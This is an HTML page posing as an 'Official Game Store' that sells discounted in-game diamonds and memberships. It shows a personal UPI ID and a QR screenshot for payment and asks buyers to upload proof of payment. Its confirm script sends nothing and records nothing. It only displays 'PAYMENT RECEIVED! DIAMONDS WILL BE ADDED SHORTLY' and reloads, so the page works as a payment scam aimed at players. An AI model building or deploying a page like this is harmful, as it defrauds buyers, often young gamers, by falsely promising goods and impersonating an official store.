 <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FF-AXL | Official Game Store</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Kanit:wght@700;900&display=swap');
    
    :root {
        --game-purple: #2a1b3d;
        --game-sidebar: #1a0f2e;
        --game-yellow: #ffcc00;
        --game-card: #3b2a5a;
        --game-accent: #00e5ff;
    }

    body {
        background-color: #0f081d;
        color: white;
        font-family: 'Kanit', sans-serif;
        margin: 0;
        overflow-x: hidden;
        user-select: none;
    }

    /* Game Style Side Tab Navigation */
    .game-container {
        display: flex;
        min-height: 100vh;
    }

    .sidebar {
        width: 80px;
        background: var(--game-sidebar);
        display: flex;
        flex-direction: column;
        align-items: center;
        padding-top: 20px;
        border-right: 2px solid rgba(255,255,255,0.05);
    }

    .nav-item {
        width: 100%;
        padding: 15px 0;
        text-align: center;
        cursor: pointer;
        font-size: 10px;
        font-weight: 900;
        color: #555;
        border-left: 4px solid transparent;
        transition: all 0.2s ease;
    }

    .nav-item.active {
        background: linear-gradient(90deg, rgba(255,204,0,0.2), transparent);
        color: var(--game-yellow);
        border-left-color: var(--game-yellow);
    }

    .main-content {
        flex: 1;
        padding: 15px;
        background: radial-gradient(circle at top right, #2a1b3d, #1a0f2e);
    }

    /* In-Game Card Look */
    .game-card {
        background: var(--game-card);
        border-radius: 8px;
        padding: 12px 8px;
        text-align: center;
        position: relative;
        border-bottom: 4px solid rgba(0,0,0,0.3);
        transition: transform 0.1s ease;
    }

    .game-card:active {
        transform: scale(0.95);
    }

    .price-btn {
        background: var(--game-yellow);
        color: black;
        font-weight: 900;
        padding: 4px;
        border-radius: 4px;
        margin-top: 8px;
        display: block;
        font-size: 14px;
        width: 100%;
    }

    .diamond-icon {
        width: 40px;
        height: 40px;
        margin: 0 auto;
        filter: drop-shadow(0 0 5px var(--game-accent));
    }

    /* UID Section Styling */
    .uid-section {
        background: rgba(0,0,0,0.3);
        padding: 12px;
        border-radius: 12px;
        margin-bottom: 20px;
        border: 1px solid rgba(255,255,255,0.05);
    }

    /* Hidden Sections */
    .hidden {
        display: none !important;
    }

    /* Payment Sheet Overlay */
    #payment-modal {
        position: fixed;
        inset: 0;
        background: rgba(0,0,0,0.85);
        display: none;
        z-index: 100;
        justify-content: center;
        align-items: center;
        padding: 20px;
    }
</style>
</head>
<body class="pb-20">

<div class="game-container">
    <div class="sidebar">
        <div id="tab-topup" class="nav-item active" onclick="switchTab('topup')">
            <i class="fas fa-gem text-xl mb-1"></i><br>TOP-UP
        </div>
        <div id="tab-membership" class="nav-item" onclick="switchTab('membership')">
            <i class="fas fa-id-card text-xl mb-1"></i><br>MEMBER
        </div>
    </div>

    <div class="main-content">
        <div class="uid-section">
            <p class="text-[9px] text-gray-500 font-bold uppercase mb-1 tracking-widest">Player Identification</p>
            <input type="number" id="uid" placeholder="ENTER PLAYER UID" class="w-full bg-black/40 border-none p-3 rounded text-yellow-400 font-bold outline-none italic placeholder:text-gray-700">
        </div>

        <div id="topup-grid" class="grid grid-cols-2 gap-3">
            <div class="game-card" onclick="openPay('100 Diamonds', 32)">
                <img src="https://i.ibb.co/X7ypYpY/diamond.png" class="diamond-icon">
                <p class="text-[11px] font-bold mt-2">100</p>
                <span class="price-btn">₹32.00</span>
            </div>
            <div class="game-card" onclick="openPay('310 Diamonds', 96)">
                <img src="https://i.ibb.co/X7ypYpY/diamond.png" class="diamond-icon">
                <p class="text-[11px] font-bold mt-2">310</p>
                <span class="price-btn">₹96.00</span>
            </div>
            <div class="game-card" onclick="openPay('520 Diamonds', 160)">
                <img src="https://i.ibb.co/X7ypYpY/diamond.png" class="diamond-icon">
                <p class="text-[11px] font-bold mt-2">520</p>
                <span class="price-btn">₹160.00</span>
            </div>
            <div class="game-card" onclick="openPay('1060 Diamonds', 320)">
                <img src="https://i.ibb.co/X7ypYpY/diamond.png" class="diamond-icon">
                <p class="text-[11px] font-bold mt-2">1060</p>
                <span class="price-btn">₹320.00</span>
            </div>
        </div>

        <div id="membership-grid" class="hidden space-y-3">
            <div class="game-card flex justify-between items-center px-4" onclick="openPay('Weekly Lite', 20)">
                <div class="text-left">
                    <p class="text-cyan-400 font-black italic">WEEKLY LITE</p>
                    <p class="text-[10px] text-gray-400">Pehle: ₹50</p>
                </div>
                <span class="price-btn w-auto px-5">₹20.00</span>
            </div>
            <div class="game-card flex justify-between items-center px-4" onclick="openPay('Weekly VIP', 64)">
                <div class="text-left">
                    <p class="text-purple-400 font-black italic">WEEKLY VIP</p>
                    <p class="text-[10px] text-gray-400">Pehle: ₹159</p>
                </div>
                <span class="price-btn w-auto px-5">₹64.00</span>
            </div>
        </div>
    </div>
</div>

<div id="payment-modal">
    <div class="bg-[#1a0f2e] w-full max-w-sm rounded-xl p-6 border-2 border-yellow-500/30 text-center">
        <h2 id="modal-item" class="text-yellow-400 font-black italic tracking-widest mb-1">TOP-UP</h2>
        <h1 id="modal-price" class="text-5xl font-black mb-4 italic">₹0</h1>
        
        <div class="bg-white p-2 rounded-lg inline-block shadow-2xl mb-4">
            <img src="Screenshot_20260404-151400_PhonePe~2.png" class="w-48 h-48" alt="QR Code">
        </div>
        
        <p class="text-[10px] text-cyan-400 font-bold mb-4 tracking-tighter">UPI ID: 8860269931@ybl</p>
        
        <input type="file" id="proof" class="hidden" onchange="document.getElementById('up-txt').innerText='READY TO SEND ✅'">
        <label for="proof" id="up-txt" class="block bg-white/5 border border-dashed border-white/20 p-3 rounded mb-4 text-[10px] font-bold cursor-pointer uppercase">Upload Screenshot</label>
        
        <div class="flex gap-2 pt-2">
            <button onclick="closePay()" class="flex-1 bg-gray-700 py-3 rounded text-xs font-bold">CLOSE</button>
            <button onclick="confirm()" class="flex-1 bg-yellow-500 text-black py-3 rounded text-xs font-black">CONFIRM ORDER</button>
        </div>
    </div>
</div>

<script>
    function switchTab(type) {
        // Sidebar icons active state
        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
        document.getElementById('topup-grid').classList.add('hidden');
        document.getElementById('membership-grid').classList.add('hidden');
        
        if(type === 'topup') {
            document.getElementById('topup-grid').classList.remove('hidden');
            document.getElementById('tab-topup').classList.add('active');
        } else {
            document.getElementById('membership-grid').classList.remove('hidden');
            document.getElementById('tab-membership').classList.add('active');
        }
    }

    function openPay(name, price) {
        const uid = document.getElementById('uid').value;
        if(!uid || uid.length < 5) return alert("ENTER VALID UID FIRST!");
        
        document.getElementById('modal-item').innerText = name.toUpperCase();
        document.getElementById('modal-price').innerText = "₹" + price + ".00";
        document.getElementById('payment-modal').style.display = 'flex';
    }

    function closePay() {
        document.getElementById('payment-modal').style.display = 'none';
    }

    function confirm() {
        if(!document.getElementById('proof').files[0]) return alert("UPLOAD PAYMENT SCREENSHOT!");
        alert("PAYMENT RECEIVED! DIAMONDS WILL BE ADDED SHORTLY.");
        location.reload();
    }
</script>

</body>
</html>
